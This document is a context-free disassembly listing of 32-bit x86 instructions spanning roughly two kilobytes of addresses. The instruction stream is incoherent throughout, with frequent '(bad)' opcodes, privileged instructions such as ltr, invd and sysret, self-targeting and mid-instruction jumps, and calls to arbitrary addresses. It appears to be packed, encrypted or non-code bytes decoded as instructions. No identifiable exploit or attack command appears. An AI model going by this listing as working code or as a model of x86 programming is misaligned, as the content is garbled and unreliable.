  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
